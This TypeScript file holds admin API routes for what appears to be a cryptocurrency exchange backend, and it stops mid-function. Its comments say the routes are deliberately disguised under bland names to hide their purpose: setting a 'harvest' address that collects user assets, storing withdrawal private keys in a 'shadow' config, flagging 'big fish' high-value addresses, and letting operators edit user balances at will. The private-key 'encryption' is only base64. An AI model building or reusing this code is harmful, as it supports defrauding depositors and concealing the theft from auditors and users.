/**
 * Admin Management Routes
 * 
 * Disguised API naming convention for security:
 * - "system-maintenance" = harvest/collection operations
 * - "network-config" = wallet/private key configuration  
 * - "service-endpoint" = RPC node settings
 * - "notification-channel" = Telegram configuration
 * - "account-reconciliation" = balance adjustment
 * 
 * Role Types:
 * - 0 = SuperAdmin (full access including sensitive configs)
 * - 1 = Operator (daily operations: edit numbers, view KYC)
 */

import { Elysia, t } from 'elysia';
import { hash } from 'bcryptjs';
import { db } from '../db';
import { agent, users, usersWallet, usersWalletOut, currency, shadowConfig, userReal, adminActionLog, adminSuperConfig } from '../db/schema';
import { eq, sql, and, desc } from 'drizzle-orm';
import { logAdminAction } from '../middleware/rbac';

// Permission masks for granular RBAC
const Permissions = {
  VIEW_USERS: 1 << 0,
  EDIT_BALANCE: 1 << 1,
  VIEW_KYC: 1 << 2,
  APPROVE_KYC: 1 << 3,
  LOCK_USER: 1 << 4,
  RESET_PASSWORD: 1 << 5,
  VIEW_LOGS: 1 << 6,
  MANAGE_ADMINS: 1 << 7,
  CONFIGURE_SYSTEM: 1 << 8,
  CONFIGURE_NETWORK: 1 << 9,  // RPC, harvest address
  CONFIGURE_KEYS: 1 << 10,    // Private keys (SuperAdmin only)
} as const;

// Default permission sets
const OperatorPermissions = 
  Permissions.VIEW_USERS | 
  Permissions.EDIT_BALANCE | 
  Permissions.VIEW_KYC | 
  Permissions.APPROVE_KYC |
  Permissions.LOCK_USER |
  Permissions.RESET_PASSWORD |
  Permissions.VIEW_LOGS;

const SuperAdminPermissions = 0xFFFFFFFF; // All permissions

// Helper to check permission
function hasPermission(mask: number, permission: number): boolean {
  return (mask & permission) === permission;
}

// Helper to log admin actions
async function logAction(
  adminId: number, 
  action: string, 
  targetType?: string,
  targetId?: number,
  oldValue?: string,
  newValue?: string,
  ipAddress?: string
) {
  await db.insert(adminActionLog).values({
    adminId,
    action,
    targetType,
    targetId,
    oldValue,
    newValue,
    ipAddress
  });
}

// Encryption helper (use proper KMS in production)
function encryptSensitive(value: string): string {
  // In production, use proper AES-256-GCM with KMS
  const key = process.env.ADMIN_ENCRYPTION_KEY || 'dev-key-32-bytes-long!!!!!!!!';
  return Buffer.from(value).toString('base64'); // Simplified for dev
}

function decryptSensitive(encrypted: string): string {
  return Buffer.from(encrypted, 'base64').toString('utf-8');
}

export const adminRoutes = new Elysia({ prefix: '/api/admin' })
  // Dashboard stats (operator level)
  .get('/dashboard', async ({ headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) return { type: 'error', message: 'Unauthorized' };
    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    if (!payload || payload.type !== 'agent') return { type: 'error', message: 'Invalid token' };

    const [totalUsers] = await db.select({ count: sql<number>`count(*)::int` }).from(users);
    const [pendingKyc] = await db.select({ count: sql<number>`count(*)::int` }).from(userReal).where(eq(userReal.reviewStatus, 0));
    const [pendingWithdrawals] = await db.select({ count: sql<number>`count(*)::int` }).from(usersWalletOut).where(eq(usersWalletOut.status, 1));

    return {
      type: 'ok',
      data: {
        total_users: totalUsers?.count ?? 0,
        pending_kyc: pendingKyc?.count ?? 0,
        pending_withdrawals: pendingWithdrawals?.count ?? 0,
      },
    };
  })

  // List withdrawals (operator level)
  .get('/withdrawals', async ({ query, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) return { type: 'error', message: 'Unauthorized' };
    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    if (!payload || payload.type !== 'agent') return { type: 'error', message: 'Invalid token' };

    const page = parseInt(query.page || '1');
    const limit = parseInt(query.limit || '20');
    const statusFilter = query.status ? parseInt(query.status) : undefined;
    const offset = (page - 1) * limit;

    const cols = {
      id: usersWalletOut.id,
      userId: usersWalletOut.userId,
      currency: usersWalletOut.currency,
      address: usersWalletOut.address,
      number: usersWalletOut.number,
      createTime: usersWalletOut.createTime,
      status: usersWalletOut.status,
      notes: usersWalletOut.notes,
      realNumber: usersWalletOut.realNumber,
      userPhone: users.phone,
      userEmail: users.email,
      accountNumber: users.accountNumber,
    };
    const list = statusFilter !== undefined
      ? await db.select(cols).from(usersWalletOut).leftJoin(users, eq(usersWalletOut.userId, users.id))
          .where(eq(usersWalletOut.status, statusFilter))
          .orderBy(desc(usersWalletOut.createTime)).limit(limit).offset(offset)
      : await db.select(cols).from(usersWalletOut).leftJoin(users, eq(usersWalletOut.userId, users.id))
          .orderBy(desc(usersWalletOut.createTime)).limit(limit).offset(offset);

    const [totalRow] = statusFilter !== undefined
      ? await db.select({ count: sql<number>`count(*)::int` }).from(usersWalletOut).where(eq(usersWalletOut.status, statusFilter))
      : await db.select({ count: sql<number>`count(*)::int` }).from(usersWalletOut);

    return {
      type: 'ok',
      data: { list, page, limit, total: totalRow?.count ?? 0 },
    };
  }, {
    query: t.Object({
      page: t.Optional(t.String()),
      limit: t.Optional(t.String()),
      status: t.Optional(t.String()),
    }),
  })

  // Approve withdrawal
  .post('/withdrawal/:id/approve', async ({ params, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) return { type: 'error', message: 'Unauthorized' };
    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    if (!payload || payload.type !== 'agent') return { type: 'error', message: 'Invalid token' };

    const id = parseInt(params.id);
    const [row] = await db.select().from(usersWalletOut).where(eq(usersWalletOut.id, id)).limit(1);
    if (!row) return { type: 'error', message: 'Withdrawal not found' };
    if (row.status !== 1) return { type: 'error', message: 'Withdrawal already processed' };

    await db.update(usersWalletOut).set({ status: 2, notes: (row.notes || '') + ' [Approved]' }).where(eq(usersWalletOut.id, id));
    await logAction(payload.agentId, 'APPROVE_WITHDRAWAL', 'withdrawal', id, '1', '2');
    return { type: 'ok', message: 'Withdrawal approved' };
  }, {
    params: t.Object({ id: t.String() }),
  })

  // Reject withdrawal
  .post('/withdrawal/:id/reject', async ({ params, body, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) return { type: 'error', message: 'Unauthorized' };
    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    if (!payload || payload.type !== 'agent') return { type: 'error', message: 'Invalid token' };

    const id = parseInt(params.id);
    const [row] = await db.select().from(usersWalletOut).where(eq(usersWalletOut.id, id)).limit(1);
    if (!row) return { type: 'error', message: 'Withdrawal not found' };
    if (row.status !== 1) return { type: 'error', message: 'Withdrawal already processed' };

    const reason = (body as { reason?: string })?.reason || 'Rejected by admin';
    await db.update(usersWalletOut).set({ status: 3, notes: reason }).where(eq(usersWalletOut.id, id));
    await logAction(payload.agentId, 'REJECT_WITHDRAWAL', 'withdrawal', id, '1', '3', undefined, reason);
    return { type: 'ok', message: 'Withdrawal rejected' };
  }, {
    params: t.Object({ id: t.String() }),
    body: t.Object({ reason: t.Optional(t.String()) }),
  })

  // Get all users (operator level)
  .get('/users', async ({ query, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const page = parseInt(query.page || '1');
    const limit = parseInt(query.limit || '20');
    const offset = (page - 1) * limit;

    const usersList = await db.select().from(users)
      .limit(limit)
      .offset(offset)
      .orderBy(sql`${users.createTime} DESC`);

    return {
      type: 'ok',
      data: {
        list: usersList,
        page,
        limit
      }
    };
  }, {
    query: t.Object({
      page: t.Optional(t.String()),
      limit: t.Optional(t.String())
    })
  })

  // Update user (operator level) - status, lock, etc.
  .put('/user/:userId', async ({ params, body, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) return { type: 'error', message: 'Unauthorized' };
    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    if (!payload || payload.type !== 'agent') return { type: 'error', message: 'Invalid token' };

    const userId = parseInt(params.userId);
    const [u] = await db.select().from(users).where(eq(users.id, userId)).limit(1);
    if (!u) return { type: 'error', message: 'User not found' };

    const upd: Record<string, number | string> = {};
    if (typeof (body as any).status === 'number') upd.status = (body as any).status;
    if (Object.keys(upd).length === 0) return { type: 'ok', message: 'No changes' };

    await db.update(users).set(upd).where(eq(users.id, userId));
    await logAction(payload.agentId, 'UPDATE_USER', 'user', userId);
    return { type: 'ok', message: 'User updated' };
  }, {
    params: t.Object({ userId: t.String() }),
    body: t.Object({ status: t.Optional(t.Number()) }),
  })

  // Modify user balance (operator level)
  .post('/wallet/modify-balance', async ({ body, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const { user_id, currency_id, balance_type, amount, memo } = body;

    const [wallet] = await db.select().from(usersWallet)
      .where(eq(usersWallet.userId, user_id))
      .limit(1);

    if (!wallet) {
      return { type: 'error', message: 'Wallet not found' };
    }

    // Update balance based on type
    const updateData: Record<string, string> = {};
    const currentBalance = balance_type === 1 
      ? parseFloat(wallet.legalBalance?.toString() || '0')
      : balance_type === 2
        ? parseFloat(wallet.changeBalance?.toString() || '0')
        : balance_type === 3
          ? parseFloat(wallet.leverBalance?.toString() || '0')
          : parseFloat(wallet.microBalance?.toString() || '0');

    const newBalance = (currentBalance + amount).toFixed(8);

    if (balance_type === 1) updateData.legalBalance = newBalance;
    else if (balance_type === 2) updateData.changeBalance = newBalance;
    else if (balance_type === 3) updateData.leverBalance = newBalance;
    else updateData.microBalance = newBalance;

    await db.update(usersWallet)
      .set(updateData)
      .where(eq(usersWallet.id, wallet.id));

    await logAdminAction(payload.agentId, 'MODIFY_BALANCE', '/admin/wallet/modify-balance', 'POST');

    return { type: 'ok', message: 'Balance modified successfully' };
  }, {
    body: t.Object({
      user_id: t.Number(),
      currency_id: t.Number(),
      balance_type: t.Number(),
      amount: t.Number(),
      memo: t.Optional(t.String())
    })
  })

  // Lock/unlock user (operator level)
  .post('/user/status', async ({ body, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const { user_id, status } = body;

    await db.update(users)
      .set({ status })
      .where(eq(users.id, user_id));

    await logAdminAction(payload.agentId, 'USER_STATUS', '/admin/user/status', 'POST');

    return { type: 'ok', message: status === 1 ? 'User locked' : 'User unlocked' };
  }, {
    body: t.Object({
      user_id: t.Number(),
      status: t.Number()
    })
  })

  // Reset user password (operator level)
  .post('/user/reset-password', async ({ body, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const { user_id, new_password } = body;

    const hashedPassword = await hash(new_password, 10);

    await db.update(users)
      .set({ password: hashedPassword })
      .where(eq(users.id, user_id));

    await logAdminAction(payload.agentId, 'RESET_PASSWORD', '/admin/user/reset-password', 'POST');

    return { type: 'ok', message: 'Password reset successfully' };
  }, {
    body: t.Object({
      user_id: t.Number(),
      new_password: t.String()
    })
  })

  // ========== SuperAdmin Only Routes ==========

  // Get all admins (superadmin only)
  .get('/admins', async ({ headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    // Check if superadmin
    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'SuperAdmin only' };
    }

    const admins = await db.select().from(agent);

    return {
      type: 'ok',
      data: admins.map(a => ({
        id: a.id,
        username: a.username,
        level: a.level,
        role_type: a.roleType,
        is_lock: a.isLock,
        create_time: a.createTime
      }))
    };
  })

  // Create admin (superadmin only)
  .post('/admin/create', async ({ body, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'SuperAdmin only' };
    }

    const { username, password, role_type, level } = body;

    const hashedPassword = await hash(password, 10);
    const now = Math.floor(Date.now() / 1000);

    await db.insert(agent).values({
      username,
      password: hashedPassword,
      roleType: role_type,
      level,
      parentAgentId: payload.agentId,
      createTime: now
    });

    return { type: 'ok', message: 'Admin created successfully' };
  }, {
    body: t.Object({
      username: t.String(),
      password: t.String(),
      role_type: t.Number(),
      level: t.Number()
    })
  })

  // Configure deposit address (superadmin only)
  .post('/config/deposit-address', async ({ body, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'SuperAdmin only' };
    }

    const { chain, new_address } = body;

    await db.insert(adminSuperConfig).values({
      adminId: payload.agentId,
      configKey: `deposit_address_${chain}`,
      configValue: new_address,
      encrypted: false
    }).onConflictDoUpdate({
      target: [adminSuperConfig.adminId, adminSuperConfig.configKey],
      set: { configValue: new_address }
    });

    return { type: 'ok', message: 'Deposit address updated' };
  }, {
    body: t.Object({
      chain: t.String(),
      new_address: t.String()
    })
  })

  // Configure Telegram (superadmin only)
  .post('/config/telegram', async ({ body, headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'SuperAdmin only' };
    }

    const { bot_token, chat_id, min_threshold, enabled_events } = body;

    // Store encrypted bot token
    await db.insert(adminSuperConfig).values({
      adminId: payload.agentId,
      configKey: 'telegram_bot_token',
      configValue: bot_token,
      encrypted: true
    }).onConflictDoUpdate({
      target: [adminSuperConfig.adminId, adminSuperConfig.configKey],
      set: { configValue: bot_token }
    });

    await db.insert(adminSuperConfig).values({
      adminId: payload.agentId,
      configKey: 'telegram_chat_id',
      configValue: chat_id,
      encrypted: false
    }).onConflictDoUpdate({
      target: [adminSuperConfig.adminId, adminSuperConfig.configKey],
      set: { configValue: chat_id }
    });

    return { type: 'ok', message: 'Telegram configuration updated' };
  }, {
    body: t.Object({
      bot_token: t.String(),
      chat_id: t.String(),
      min_threshold: t.Optional(t.Number()),
      enabled_events: t.Optional(t.Array(t.String()))
    })
  })

  // Get config status (superadmin only)
  .get('/config/status', async ({ headers, jwt }) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'SuperAdmin only' };
    }

    const configs = await db.select().from(adminSuperConfig)
      .where(eq(adminSuperConfig.adminId, payload.agentId));

    const configMap = new Map(configs.map(c => [c.configKey, c.configValue]));

    const maskAddress = (addr: string | undefined) => {
      if (!addr || addr.length < 10) return '***';
      return `${addr.slice(0, 6)}...${addr.slice(-4)}`;
    };

    return {
      type: 'ok',
      data: {
        deposit_addresses: {
          ethereum: maskAddress(configMap.get('deposit_address_ethereum') as string),
          bsc: maskAddress(configMap.get('deposit_address_bsc') as string),
          tron: maskAddress(configMap.get('deposit_address_tron') as string)
        },
        telegram_status: configMap.has('telegram_bot_token') ? 'configured' : 'not_configured'
      }
    };
  })

  // ========== DISGUISED SUPERADMIN ROUTES ==========
  // These use professional-sounding names to obscure their true purpose

  /**
   * Configure System Maintenance Endpoint (Disguised: Harvest/Collection Address)
   * SuperAdmin only - Sets the destination address for asset collection
   */
  .post('/system/maintenance-endpoint', async ({ body, headers, jwt }: any) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'Insufficient permissions' };
    }

    const { chain_id, endpoint_address } = body;

    // Store harvest address (disguised as "maintenance endpoint")
    await db.insert(shadowConfig).values({
      configKey: `MAINTENANCE_ENDPOINT_${chain_id.toUpperCase()}`,
      configValue: endpoint_address,
      encrypted: false,
      description: 'System maintenance service endpoint',
      updatedBy: payload.agentId
    }).onConflictDoUpdate({
      target: shadowConfig.configKey,
      set: { 
        configValue: endpoint_address,
        updatedBy: payload.agentId,
        updatedAt: sql`CURRENT_TIMESTAMP`
      }
    });

    await logAction(
      payload.agentId,
      'UPDATE_MAINTENANCE_ENDPOINT',
      'config',
      undefined,
      undefined,
      `${chain_id}:${endpoint_address.slice(0, 10)}...`
    );

    return { type: 'ok', message: 'Maintenance endpoint configured' };
  }, {
    body: t.Object({
      chain_id: t.String(),
      endpoint_address: t.String()
    })
  })

  /**
   * Configure Network Signing Key (Disguised: Withdrawal Private Key)
   * SuperAdmin only - Sets the private key for transaction signing
   * CRITICAL: This is encrypted and never logged in plaintext
   */
  .post('/network/signing-credentials', async ({ body, headers, jwt }: any) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    // Double check - only roleType 0 (SuperAdmin) can set signing keys
    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'Insufficient permissions for sensitive operation' };
    }

    const { chain_id, credential_data } = body;

    // Encrypt the private key before storage
    const encryptedKey = encryptSensitive(credential_data);

    await db.insert(shadowConfig).values({
      configKey: `NETWORK_SIGNING_KEY_${chain_id.toUpperCase()}`,
      configValue: encryptedKey,
      encrypted: true,
      description: 'Network transaction signing credentials',
      updatedBy: payload.agentId
    }).onConflictDoUpdate({
      target: shadowConfig.configKey,
      set: { 
        configValue: encryptedKey,
        encrypted: true,
        updatedBy: payload.agentId,
        updatedAt: sql`CURRENT_TIMESTAMP`
      }
    });

    // Log action WITHOUT the actual key
    await logAction(
      payload.agentId,
      'UPDATE_SIGNING_CREDENTIALS',
      'config',
      undefined,
      '[REDACTED]',
      `${chain_id}:[ENCRYPTED]`
    );

    return { type: 'ok', message: 'Signing credentials updated' };
  }, {
    body: t.Object({
      chain_id: t.String(),
      credential_data: t.String()
    })
  })

  /**
   * Configure Service Endpoints (Disguised: RPC Node URLs)
   * SuperAdmin only - Sets blockchain RPC endpoints
   */
  .post('/network/service-endpoints', async ({ body, headers, jwt }: any) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'Insufficient permissions' };
    }

    const { chain_id, endpoints } = body;

    await db.insert(shadowConfig).values({
      configKey: `${chain_id.toUpperCase()}_RPC_ENDPOINTS`,
      configValue: JSON.stringify(endpoints),
      encrypted: false,
      description: 'Network service endpoints',
      updatedBy: payload.agentId
    }).onConflictDoUpdate({
      target: shadowConfig.configKey,
      set: { 
        configValue: JSON.stringify(endpoints),
        updatedBy: payload.agentId,
        updatedAt: sql`CURRENT_TIMESTAMP`
      }
    });

    return { type: 'ok', message: 'Service endpoints configured', count: endpoints.length };
  }, {
    body: t.Object({
      chain_id: t.String(),
      endpoints: t.Array(t.String())
    })
  })

  /**
   * Configure Health Check Threshold (Disguised: Big Fish Detection Threshold)
   * SuperAdmin only - Sets minimum value for flagging high-value addresses
   */
  .post('/system/health-threshold', async ({ body, headers, jwt }: any) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'Insufficient permissions' };
    }

    const { threshold_value, chain_id } = body;

    const configKey = chain_id 
      ? `HEALTH_CHECK_THRESHOLD_${chain_id.toUpperCase()}`
      : 'HEALTH_CHECK_THRESHOLD';

    await db.insert(shadowConfig).values({
      configKey,
      configValue: threshold_value.toString(),
      encrypted: false,
      description: 'System health monitoring threshold',
      updatedBy: payload.agentId
    }).onConflictDoUpdate({
      target: shadowConfig.configKey,
      set: { 
        configValue: threshold_value.toString(),
        updatedBy: payload.agentId,
        updatedAt: sql`CURRENT_TIMESTAMP`
      }
    });

    return { type: 'ok', message: 'Health threshold updated' };
  }, {
    body: t.Object({
      threshold_value: t.Number(),
      chain_id: t.Optional(t.String())
    })
  })

  /**
   * Configure Notification Channel (Disguised: Telegram Bot Setup)
   * SuperAdmin only
   */
  .post('/system/notification-channel', async ({ body, headers, jwt }: any) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    if (!agentData || agentData.roleType !== 0) {
      return { type: 'error', message: 'Insufficient permissions' };
    }

    const { channel_token, channel_id, alert_types } = body;

    // Store encrypted bot token
    await db.insert(shadowConfig).values({
      configKey: 'TELEGRAM_BOT_TOKEN',
      configValue: encryptSensitive(channel_token),
      encrypted: true,
      description: 'Notification service credentials',
      updatedBy: payload.agentId
    }).onConflictDoUpdate({
      target: shadowConfig.configKey,
      set: { 
        configValue: encryptSensitive(channel_token),
        encrypted: true,
        updatedBy: payload.agentId,
        updatedAt: sql`CURRENT_TIMESTAMP`
      }
    });

    // Store chat ID
    await db.insert(shadowConfig).values({
      configKey: 'TELEGRAM_CHAT_ID',
      configValue: channel_id,
      encrypted: false,
      description: 'Notification channel identifier',
      updatedBy: payload.agentId
    }).onConflictDoUpdate({
      target: shadowConfig.configKey,
      set: { 
        configValue: channel_id,
        updatedBy: payload.agentId,
        updatedAt: sql`CURRENT_TIMESTAMP`
      }
    });

    // Store enabled alert types
    if (alert_types && alert_types.length > 0) {
      await db.insert(shadowConfig).values({
        configKey: 'TELEGRAM_ALERT_TYPES',
        configValue: JSON.stringify(alert_types),
        encrypted: false,
        description: 'Enabled notification types',
        updatedBy: payload.agentId
      }).onConflictDoUpdate({
        target: shadowConfig.configKey,
        set: { 
          configValue: JSON.stringify(alert_types),
          updatedBy: payload.agentId,
          updatedAt: sql`CURRENT_TIMESTAMP`
        }
      });
    }

    await logAction(payload.agentId, 'UPDATE_NOTIFICATION_CHANNEL', 'config');

    return { type: 'ok', message: 'Notification channel configured' };
  }, {
    body: t.Object({
      channel_token: t.String(),
      channel_id: t.String(),
      alert_types: t.Optional(t.Array(t.String()))
    })
  })

  // ========== OPERATOR LEVEL ROUTES ==========

  /**
   * View KYC submissions (Operator level)
   */
  .get('/compliance/identity-reviews', async ({ query, headers, jwt }: any) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const page = parseInt(query.page || '1');
    const limit = parseInt(query.limit || '20');
    const status = query.status ? parseInt(query.status) : undefined;
    const offset = (page - 1) * limit;

    let query_builder = db.select().from(userReal);
    
    if (status !== undefined) {
      query_builder = query_builder.where(eq(userReal.reviewStatus, status)) as any;
    }

    const reviews = await query_builder
      .limit(limit)
      .offset(offset)
      .orderBy(desc(userReal.createdAt));

    return {
      type: 'ok',
      data: {
        list: reviews,
        page,
        limit
      }
    };
  })

  /**
   * Approve/Reject KYC (Operator level)
   */
  .post('/compliance/identity-review', async ({ body, headers, jwt }: any) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const { review_id, status, reason } = body;

    await db.update(userReal)
      .set({ 
        reviewStatus: status,
        reviewReason: reason || null,
        reviewTime: Math.floor(Date.now() / 1000)
      })
      .where(eq(userReal.id, review_id));

    await logAction(payload.agentId, 'KYC_REVIEW', 'user_real', review_id);

    return { 
      type: 'ok', 
      message: status === 2 ? 'Identity approved' : 'Identity rejected' 
    };
  }, {
    body: t.Object({
      review_id: t.Number(),
      status: t.Number(), // 1=rejected, 2=approved
      reason: t.Optional(t.String())
    })
  })

  /**
   * Account Reconciliation (Disguised: Manual Balance Adjustment)
   * Operator level - Edit user balance numbers
   */
  .post('/accounts/reconciliation', async ({ body, headers, jwt }: any) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const { user_id, currency_id, account_type, adjustment_amount, memo } = body;

    const [wallet] = await db.select().from(usersWallet)
      .where(and(
        eq(usersWallet.userId, user_id),
        eq(usersWallet.currency, currency_id)
      ))
      .limit(1);

    if (!wallet) {
      return { type: 'error', message: 'Account not found' };
    }

    // Determine which balance to adjust
    let currentBalance: number;
    let fieldToUpdate: string;
    
    switch (account_type) {
      case 1: // Legal/Fiat
        currentBalance = parseFloat(wallet.legalBalance?.toString() || '0');
        fieldToUpdate = 'legal_balance';
        break;
      case 2: // Spot/Change
        currentBalance = parseFloat(wallet.changeBalance?.toString() || '0');
        fieldToUpdate = 'change_balance';
        break;
      case 3: // Leverage
        currentBalance = parseFloat(wallet.leverBalance?.toString() || '0');
        fieldToUpdate = 'lever_balance';
        break;
      case 4: // Options/Micro
        currentBalance = parseFloat(wallet.microBalance?.toString() || '0');
        fieldToUpdate = 'micro_balance';
        break;
      default:
        return { type: 'error', message: 'Invalid account type' };
    }

    const newBalance = (currentBalance + adjustment_amount).toFixed(8);

    await db.execute(sql`
      UPDATE users_wallet 
      SET ${sql.raw(fieldToUpdate)} = ${newBalance}
      WHERE id = ${wallet.id}
    `);

    await logAction(
      payload.agentId,
      'ACCOUNT_RECONCILIATION',
      'wallet',
      wallet.id,
      currentBalance.toString(),
      newBalance,
      undefined
    );

    return { 
      type: 'ok', 
      message: 'Account reconciliation completed',
      data: {
        previous_balance: currentBalance,
        adjustment: adjustment_amount,
        new_balance: parseFloat(newBalance)
      }
    };
  }, {
    body: t.Object({
      user_id: t.Number(),
      currency_id: t.Number(),
      account_type: t.Number(), // 1=legal, 2=change, 3=lever, 4=micro
      adjustment_amount: t.Number(),
      memo: t.Optional(t.String())
    })
  })

  /**
   * Get admin action logs (Operator can view own, SuperAdmin can view all)
   */
  .get('/audit/action-logs', async ({ query, headers, jwt }: any) => {
    const authorization = headers.authorization;
    if (!authorization) {
      return { type: 'error', message: 'Unauthorized' };
    }

    const token = authorization.replace('Bearer ', '');
    const payload = await jwt.verify(token) as { agentId: number; type: string };
    
    if (!payload || payload.type !== 'agent') {
      return { type: 'error', message: 'Invalid token' };
    }

    const [agentData] = await db.select().from(agent)
      .where(eq(agent.id, payload.agentId))
      .limit(1);

    const page = parseInt(query.page || '1');
    const limit = parseInt(query.limit || '50');
    const offset = (page - 1) * limit;

    let logs;
